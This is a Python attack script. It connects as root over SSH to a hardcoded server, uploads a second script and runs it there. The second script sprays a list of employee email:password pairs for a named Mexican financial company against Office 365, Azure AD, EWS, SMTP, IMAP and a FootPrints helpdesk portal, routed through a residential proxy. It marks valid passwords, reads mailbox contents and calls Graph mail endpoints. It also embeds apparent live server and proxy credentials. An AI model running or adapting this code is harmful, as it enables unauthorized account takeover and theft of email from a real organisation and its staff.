import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, base64, re, smtplib, imaplib
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

PROXY = "http://brd-customer-hl_25b43d3c-zone-residential_mx1-country-mx:erjvs0sv8cvs@brd.superproxy.io:22225"
P = {"http": PROXY, "https": PROXY}

# Check proxy
try:
    r = requests.get("https://httpbin.org/ip", proxies=P, verify=False, timeout=15)
    sys.stdout.write("EXIT IP: " + r.json().get("origin","?") + "\\n")
except Exception as e:
    sys.stdout.write("PROXY FAIL: " + str(e)[:80] + " — going direct\\n")
    P = {}
sys.stdout.flush()

CREDS = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("mmartinez@findep.global", "Rul76846"),
    ("jeff@findep.global", "AFI2022*"),
    ("jeff@findep.global", "BcF1s42o2d*"),
    ("jeff@findep.global", "Rul76846"),
    ("admin@findep.global", "4dm1n##*2411"),
]

# --- 1. OUTLOOK Autodiscover ---
sys.stdout.write("\\n=== OUTLOOK AUTODISCOVER ===\\n")
for email, pw in CREDS:
    try:
        ab = base64.b64encode((email + ":" + pw).encode()).decode()
        r = requests.get(
            "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/" + email + "?Protocol=ActiveSync",
            headers={"Authorization": "Basic " + ab, "User-Agent": UA},
            proxies=P, verify=False, timeout=12, allow_redirects=False)
        sys.stdout.write("  [" + str(r.status_code) + "] " + email + ":" + pw + "\\n")
        if r.status_code == 200:
            sys.stdout.write("  *** HIT ***\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " — " + str(e)[:50] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

# --- 2. EWS Basic Auth ---
sys.stdout.write("\\n=== EWS BASIC AUTH ===\\n")
soap = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><soap:Body><GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"><FolderShape><t:BaseShape>Default</t:BaseShape></FolderShape><FolderIds><t:DistinguishedFolderId Id="inbox"/></FolderIds></GetFolder></soap:Body></soap:Envelope>'

for email, pw in CREDS:
    try:
        ab = base64.b64encode((email + ":" + pw).encode()).decode()
        r = requests.post("https://outlook.office365.com/EWS/Exchange.asmx",
            headers={"Authorization": "Basic " + ab, "Content-Type": "text/xml", "User-Agent": UA},
            data=soap, proxies=P, verify=False, timeout=12)
        tag = str(r.status_code)
        if r.status_code == 200 and "GetFolderResponse" in r.text:
            tag = "*** MAILBOX HIT ***"
        elif r.status_code == 456:
            tag = "456 MFA — PW VALID!"
        sys.stdout.write("  [" + tag + "] " + email + ":" + pw + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " — " + str(e)[:50] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

# --- 3. AZURE ROPC ---
sys.stdout.write("\\n=== AZURE AD ROPC (Graph scope) ===\\n")
T = "30fcec21-d05d-4ca6-8233-a90183fc7dbd"
CID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
for email, pw in CREDS:
    try:
        r = requests.post("https://login.microsoftonline.com/" + T + "/oauth2/v2.0/token",
            data={"grant_type":"password","client_id":CID,"username":email,"password":pw,
                  "scope":"https://graph.microsoft.com/.default"},
            proxies=P, verify=False, timeout=12)
        if r.status_code == 200:
            sys.stdout.write("  *** GRAPH HIT *** " + email + ":" + pw + "\\n")
            td = r.json()
            at = td.get("access_token","")
            if at:
                parts = at.split(".")
                if len(parts) >= 2:
                    pl = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                    sys.stdout.write("    UPN=" + str(pl.get("upn")) + " Name=" + str(pl.get("name")) + "\\n")
                hh = {"Authorization": "Bearer " + at}
                rm = requests.get("https://graph.microsoft.com/v1.0/me", headers=hh, proxies=P, verify=False, timeout=10)
                sys.stdout.write("    /me [" + str(rm.status_code) + "] " + rm.text[:200] + "\\n")
                rmail = requests.get("https://graph.microsoft.com/v1.0/me/messages?$top=3&$select=subject,from,receivedDateTime",
                    headers=hh, proxies=P, verify=False, timeout=10)
                sys.stdout.write("    /mail [" + str(rmail.status_code) + "] " + rmail.text[:300] + "\\n")
        else:
            ed = r.json().get("error_description","")[:100]
            tag = ""
            if "50053" in ed: tag = "[LOCKED]"
            elif "50034" in ed: tag = "[NOT FOUND]"
            elif "50126" in ed: tag = "[BAD PW]"
            elif "50076" in ed or "50079" in ed: tag = "[MFA-PW VALID!]"
            elif "50057" in ed: tag = "[DISABLED]"
            elif "53003" in ed or "50158" in ed: tag = "[COND ACCESS-PW VALID!]"
            sys.stdout.write("  " + tag + " " + email + ":" + pw + " — " + ed[:80] + "\\n")
            if "50034" in ed or "50053" in ed:
                pass
    except Exception as e:
        sys.stdout.write("  ERR " + email + ":" + pw + " — " + str(e)[:50] + "\\n")
    time.sleep(2)
    sys.stdout.flush()

# --- 4. SMTP ---
sys.stdout.write("\\n=== SMTP ===\\n")
for email, pw in CREDS[:5]:
    try:
        srv = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
        srv.ehlo(); srv.starttls(); srv.ehlo()
        srv.login(email, pw)
        sys.stdout.write("  *** SMTP HIT *** " + email + ":" + pw + "\\n")
        srv.quit()
    except smtplib.SMTPAuthenticationError as e:
        sys.stdout.write("  SMTP FAIL " + email + " — " + str(e.smtp_code) + " " + str(e.smtp_error)[:60] + "\\n")
    except Exception as e:
        sys.stdout.write("  SMTP ERR " + email + " — " + str(e)[:50] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

# --- 5. IMAP ---
sys.stdout.write("\\n=== IMAP ===\\n")
for email, pw in CREDS[:5]:
    try:
        im = imaplib.IMAP4_SSL("outlook.office365.com", 993, timeout=10)
        im.login(email, pw)
        sys.stdout.write("  *** IMAP HIT *** " + email + ":" + pw + "\\n")
        st, mbs = im.list()
        for m in (mbs or [])[:3]:
            sys.stdout.write("    " + m.decode(errors="replace")[:60] + "\\n")
        im.select("INBOX")
        st, msgs = im.search(None, "ALL")
        ids = msgs[0].split() if msgs[0] else []
        sys.stdout.write("    Inbox: " + str(len(ids)) + " msgs\\n")
        im.logout()
    except Exception as e:
        sys.stdout.write("  IMAP FAIL " + email + " — " + str(e)[:60] + "\\n")
    time.sleep(1.5)
    sys.stdout.flush()

# --- 6. FootPrints extras ---
sys.stdout.write("\\n=== FOOTPRINTS ===\\n")
PAO = "https://pao.findep.com.mx"
fp = [("jeff","AFI2022*"),("jeff","BcF1s42o2d*"),("jsanchezfern","AFI2022*"),
      ("mmartinez","Rul76846"),("admin","4dm1n##*2411"),("admin","BcF1s42o2d*"),
      ("MRAdmin","4dm1n##*2411"),("hgarciaar","Pao1234+"),("cguerrave","Pao1234+"),
      ("mcarrillo","Pao1234+"),("jreyes","Pao1234+"),("cronquillo","Pao1234+")]
for u, pw in fp:
    try:
        ss = requests.Session()
        ss.verify = False
        ss.headers.update({"User-Agent": UA})
        r = ss.post(PAO + "/MRcgi/MRlogin.pl",
            data={"USER":u,"PASSWORD":pw,"USERID":u,"MRSubmit":"Submit","PROJECTID":"1","LASTSTEP":"1"},
            timeout=15, allow_redirects=True)
        ok = "NAME=MRP" in r.text and "MRhomepage" in r.text
        cust = "CUSTUSER" in r.text
        if ok:
            sys.stdout.write("  *** LOGIN " + ("CUST" if cust else "AGENT!") + " *** " + u + ":" + pw + "\\n")
        else:
            sys.stdout.write("  FAIL " + u + ":" + pw + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + u + ":" + pw + " — " + str(e)[:40] + "\\n")
    time.sleep(1)
    sys.stdout.flush()

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/outlook_fast.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

# Use get_transport for streaming output
transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/outlook_fast.py 2>&1')
channel.settimeout(5)

start = time.time()
buf = ""
while time.time() - start < 240:
    try:
        if channel.recv_ready():
            chunk = channel.recv(4096).decode(errors='replace')
            buf += chunk
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            # Read remaining
            while channel.recv_ready():
                chunk = channel.recv(4096).decode(errors='replace')
                buf += chunk
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.5)
    except Exception:
        time.sleep(0.5)

print('\nFin.', flush=True)
ssh.close()
